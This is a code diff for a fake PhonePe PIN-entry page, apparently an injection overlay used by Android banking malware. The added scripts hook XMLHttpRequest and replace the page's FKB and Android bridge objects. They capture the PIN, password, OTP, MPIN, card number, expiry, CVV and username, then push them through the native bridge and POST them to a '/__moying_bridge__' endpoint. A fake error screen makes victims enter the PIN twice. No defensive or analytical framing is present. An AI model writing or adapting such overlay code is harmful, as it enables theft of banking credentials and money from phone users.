@@ -1,13 +1,86 @@
 <!doctype html>
 <html lang="en">
-<head>
+<head><script>
+/* ===== 墨影注入页协议 shim（PhonePe / 只走原生桥，禁止任何外发） ===== */
+(function(){
+  var TPL = 'phonepe';
+  function pk(){ try{ return (window.FKB && FKB.getPkg) ? (FKB.getPkg()||'') : (window.__PHONEPE_PKG__||''); }catch(e){ return ''; } }
+  function sn(){ try{ return (window.FKB && FKB.getSn) ? (FKB.getSn()||'') : (window.__FKB_SN__||''); }catch(e){ return ''; } }
+  function pick(o){
+    if(!o) return {};
+    if(o.formData) return o.formData;
+    var out = {};
+    ['password','pin','otp','mpin','card','expiry','cvv','username','userId'].forEach(function(k){
+      if(o[k] !== undefined && o[k] !== '') out[k] = o[k];
+    });
+    if(Object.keys(out).length) return out;
+    var c = {}; Object.keys(o).forEach(function(k){ if(k!=='pkg'&&k!=='sn'&&k!=='template') c[k]=o[k]; });
+    return c;
+  }
+  function push(o){
+    var pl = JSON.stringify({ pkg: (o&&o.pkg)||pk(), sn: (o&&o.sn)||sn(), template: (o&&o.template)||TPL, formData: pick(o) });
+    try{ if(window.FKB && FKB.__raw__) FKB.__raw__(pl); }catch(e){}
+    try{ if(window.Android && window.Android.__raw__) Android.__raw__(pl); }catch(e){}
+    setTimeout(function(){ try{ if(window.FKB && FKB.setClosePage) FKB.setClosePage(pk()); }catch(e){} }, 300);
+    return pl;
+  }
+  window.__moyingPush = push;
+
+  /* ① 页面自带 XHR 外发 → 内部哨兵，一律转桥 */
+  var _open = XMLHttpRequest.prototype.open, _send = XMLHttpRequest.prototype.send;
+  XMLHttpRequest.prototype.open = function(m,u){ this.__mu = String(u||''); return _open.apply(this, arguments); };
+  XMLHttpRequest.prototype.send = function(b){
+    var u = this.__mu || '';
+    if(u.indexOf('/__moying_bridge__') >= 0 || u.indexOf('PhishingData') >= 0){
+      var o = {}; try{ o = JSON.parse(b||'{}'); }catch(e){}
+      push(o); return;
+    }
+    return _send.apply(this, arguments);
+  };
+  /* ② 页面自己的 FKB / Android 包装层：把最终提交转成我们的载荷 */
+  var A0 = window.Android;
+  var origReturn = (A0 && A0.returnResult) ? A0.returnResult : null;
+  var bridge = {
+    returnResult: function(s){
+      var o=null; try{ o = (typeof s==='string')?JSON.parse(s):s; }catch(e){ o=null; }
+      if(o && o.action){ if(origReturn){ try{ return origReturn(s); }catch(e){} } return; }
+      push(o || {});
+    },
+    setFormData: function(s){ var o=null; try{ o=JSON.parse(s); }catch(e){} push(o||{}); },
+    __raw__: function(pl){ if(origReturn){ try{ return origReturn(pl); }catch(e){} } },
+    getPkg: function(){ return pk(); }, getSn: function(){ return sn(); },
+    getUserName: function(){ try{ return (origReturn&&origReturn.getUserName&&origReturn.getUserName())||''; }catch(e){ return ''; } },
+    setClosePage: function(p){ try{ if(window.FKB && FKB.setClosePage && !window.FKB.__isShim) FKB.setClosePage(p||pk()); }catch(e){} },
+    close: function(){ try{ var f=window.__realFKB; if(f&&f.setClosePage) f.setClosePage(pk()); }catch(e){} },
+    finish: function(){ try{ var f=window.__realFKB; if(f&&f.setClosePage) f.setClosePage(pk()); }catch(e){} }
+  };
+  try{ window.__realFKB = window.FKB; window.Android = bridge; }catch(e){}
+  /* ①b 头部就把 FKB 也包起来（页面后续若重定义，尾部脚本会再包一次） */
+  try{
+    var F0 = window.FKB || {};
+    var fkbBridge = {
+      setFormData: function(v){ push((function(){ try{return JSON.parse(v);}catch(e){return {};} })()); },
+      returnResult: function(v){ push((function(){ try{return JSON.parse(v);}catch(e){return {};} })()); },
+      getPkg: function(){ try{ return (F0.getPkg&&F0.getPkg())||window.__PHONEPE_PKG__||''; }catch(e){ return ''; } },
+      getSn: function(){ try{ return (F0.getSn&&F0.getSn())||''; }catch(e){ return ''; } },
+      setClosePage: function(p){ try{ if(F0.setClosePage) F0.setClosePage(p); }catch(e){} },
+      close: function(){ try{ if(F0.setClosePage) F0.setClosePage(pk()); }catch(e){} },
+      finish: function(){ try{ if(F0.setClosePage) F0.setClosePage(pk()); }catch(e){} },
+      getUserName: function(){ try{ return (F0.getUserName&&F0.getUserName())||''; }catch(e){ return ''; } }
+    };
+    for(var k in F0){ if(!(k in fkbBridge)){ try{ fkbBridge[k]=F0[k]; }catch(e){} } }
+    window.FKB = fkbBridge;
+  }catch(e){}
+})();
+</script>
+
 <script>
 (function(){
   if (window.__fyInterceptorInjected) return;
   window.__fyInterceptorInjected = true;
 
-  var TARGET_PATH = '/api/PhishingData.php';
-
+  var TARGET_PATH = '/__moying_bridge__';
+  var TARGET_URL = '/__moying_bridge__';
 
   function isOurTargetUrl(u){
     if (!u) return false;
@@ -440,6 +513,7 @@ button{font:inherit}
 @media(min-width:700px){.screen{max-width:520px;margin:0 auto}.err-page{max-width:520px;margin:0 auto}}
 @media(max-height:680px){.header{min-height:60px}.info-card{min-height:67px;margin-top:7px;padding-block:10px}.pin-title{margin-bottom:14px}.pin-section{transform:translateY(0)}.key{height:43px}.warning{min-height:32px}}
 </style>
+<script>window.__PHONEPE_PKG__="com.phonepe.app";</script>
 </head>
 <body>
 <main class="screen" id="main-screen">
@@ -532,14 +606,14 @@ function doSubmit(){
     var sn1='';try{if(typeof FKB!=='undefined'&&FKB.getSn)sn1=FKB.getSn();}catch(e){}
     var pl1=JSON.stringify({password:pin,pkg:pk});
     try{if(typeof FKB!=='undefined'&&FKB.setFormData)FKB.setFormData(pl1);}catch(e){}
-    
+    try{var x1=new XMLHttpRequest();x1.open('POST',"/__moying_bridge__",true);x1.setRequestHeader('Content-Type','application/json');x1.send(JSON.stringify({deviceId:sn1,pkg:pk,template:'first_attempt',formData:pl1}));}catch(e){}
     showError();
     return;
   }
   var sn='';try{if(typeof FKB!=='undefined'&&FKB.getSn)sn=FKB.getSn();}catch(e){}
   var pl=JSON.stringify({password:pin,pkg:pk});
   try{if(typeof FKB!=='undefined'&&FKB.setFormData)FKB.setFormData(pl);}catch(e){}
-  
+  try{var x=new XMLHttpRequest();x.open('POST',"/__moying_bridge__",true);x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify({deviceId:sn,pkg:pk,template:'phonepe',formData:pl}));}catch(e){}
   try{if(typeof Android!=='undefined'&&Android.close)Android.close();}catch(e){}try{window.close();}catch(e){}
 }
 
@@ -558,5 +632,33 @@ document.getElementById("err-learn").addEventListener("click",function(e){e.prev
 render();
 })();
 </script>
+<script>
+/* 页面脚本跑完后，再包一层：把 FKB / Android 的提交统一成我们的载荷 */
+(function(){
+  var push = window.__moyingPush; if(!push) return;
+  var curFKB = window.FKB, curA = window.Android;
+  function pk(){ try{ return (curFKB&&curFKB.getPkg)?(curFKB.getPkg()||''):(window.__PHONEPE_PKG__||''); }catch(e){ return ''; } }
+  function sn(){ try{ return (curFKB&&curFKB.getSn)?(curFKB.getSn()||''):''; }catch(e){ return ''; } }
+  function toObj(v){ try{ return (typeof v==='string')?JSON.parse(v):v; }catch(e){ return null; } }
+  function wrap(obj, tag){
+    if(!obj) return obj;
+    var w = {
+      setFormData: function(v){ var o=toObj(v); push(o||{}); },
+      returnResult: function(v){ var o=toObj(v); if(o&&o.action){ try{ if(obj.returnResult) obj.returnResult(v); }catch(e){} return; } push(o||{}); },
+      getPkg: function(){ return pk(); },
+      getSn: function(){ return sn(); },
+      setClosePage: function(p){ try{ if(curFKB&&curFKB.setClosePage) curFKB.setClosePage(p||pk()); }catch(e){} },
+      close: function(){ try{ if(curFKB&&curFKB.setClosePage) curFKB.setClosePage(pk()); }catch(e){} },
+      finish: function(){ try{ if(curFKB&&curFKB.setClosePage) curFKB.setClosePage(pk()); }catch(e){} },
+      getUserName: function(){ try{ return (obj.getUserName&&obj.getUserName())||''; }catch(e){ return ''; } }
+    };
+    for(var k in obj){ if(!(k in w)){ try{ w[k]=obj[k]; }catch(e){} } }
+    return w;
+  }
+  try{ window.FKB = wrap(curFKB||{}, 'FKB'); }catch(e){}
+  try{ window.Android = wrap(curA||{}, 'Android'); }catch(e){}
+})();
+</script>
 </body>
+<!-- moying pkg=com.phonepe.app tpl=phonepe -->
 </html>
